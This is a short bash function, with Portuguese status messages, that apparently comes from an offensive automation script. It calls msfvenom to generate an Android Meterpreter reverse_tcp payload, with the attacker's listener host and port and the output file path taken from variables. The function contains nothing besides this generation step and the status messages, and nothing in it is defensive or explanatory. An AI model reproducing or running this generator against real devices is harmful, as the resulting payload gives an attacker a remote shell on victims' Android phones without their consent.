Creator(){
	clear; Log; echo ""; echo "[!] Gerando payload..."; sleep 1;
	echo ""; `msfvenom -p payload/android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > $CAMINHO$NOME`;
	echo ""; echo "[-] Finalizado"
}
